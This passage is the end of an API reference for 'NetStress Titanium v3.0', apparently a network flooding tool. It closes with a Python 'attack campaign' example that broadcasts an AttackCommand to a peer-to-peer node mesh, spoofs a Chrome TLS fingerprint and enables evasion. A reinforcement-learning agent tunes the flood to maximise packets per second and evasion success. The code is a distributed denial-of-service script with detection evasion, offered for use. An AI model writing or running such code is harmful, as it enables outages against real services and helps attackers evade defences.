    # Phase 4: Configure Titanium Engine
    print("\n[*] Phase 4: Titanium Engine Configuration")
    config = selector.get_recommended_config(best_vector)
    config.gpu_acceleration = True
    config.ai_adaptation = True
    config.p2p_enabled = True

    # Phase 5: Execute Attack with AI Adaptation
    print("\n[*] Phase 5: Attack Execution")
    engine = TitaniumEngine(config)
    rl_agent = RLAgent("models/adaptive_attack.onnx")

    with engine:
        # Broadcast to P2P mesh
        command = AttackCommand(
            target=target,
            port=profile.open_ports[0],
            protocol=best_vector.protocol,
            rate_per_node=best_vector.recommended_rate,
            duration=best_vector.recommended_duration,
            ja4_profile="chrome_120",
            evasion_enabled=True
        )
        await mesh.broadcast_command(command)

        # Start local attack
        engine.start()

        # AI-driven adaptation loop
        for i in range(best_vector.recommended_duration):
            await asyncio.sleep(1)

            # Get current state
            state = engine.get_observation_state()
            stats = engine.get_stats()

            # AI selects optimal action
            action = rl_agent.select_action(state)
            engine.execute_action(action)

            # Calculate reward for learning
            reward = calculate_reward(stats, profile)
            rl_agent.update_model(reward, state, action)

            # Display progress
            print(f"[{i+1:3d}s] PPS: {stats.pps:10,.0f} | "
                  f"Gbps: {stats.gbps:6.2f} | "
                  f"Evasion: {stats.evasion_success_rate:5.1%} | "
                  f"P2P: {stats.p2p_node_count} nodes")

        # Final statistics
        final_stats = engine.get_stats()
        print(f"\n[+] Attack Complete")
        print(f"[+] Total packets: {final_stats.packets_sent:,}")
        print(f"[+] Average PPS: {final_stats.pps:,.0f}")
        print(f"[+] Average throughput: {final_stats.gbps:.2f} Gbps")
        print(f"[+] Evasion success: {final_stats.evasion_success_rate:.2%}")
        print(f"[+] AI adaptations: {final_stats.adaptation_count}")

def calculate_reward(stats, profile):
    """Calculate reward for RL agent"""
    # High PPS is good
    pps_reward = min(stats.pps / 10000000, 1.0)

    # Low error rate is good
    error_reward = 1.0 - (stats.errors / max(stats.packets_sent, 1))

    # High evasion success is good
    evasion_reward = stats.evasion_success_rate

    # Weighted combination
    return 0.4 * pps_reward + 0.3 * error_reward + 0.3 * evasion_reward

# Run campaign
if __name__ == "__main__":
    asyncio.run(titanium_attack_campaign("192.168.1.100"))
```

---

This comprehensive API reference covers all major components of NetStress Titanium v3.0. For more detailed examples and tutorials, see:

- [TITANIUM_UPGRADE.md](../TITANIUM_UPGRADE.md) - Migration guide from v2.x
- [examples/](../examples/) - Code examples and use cases
- [docs/PERFORMANCE_TUNING.md](PERFORMANCE_TUNING.md) - Performance optimization guide
- [docs/TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Common issues and solutions
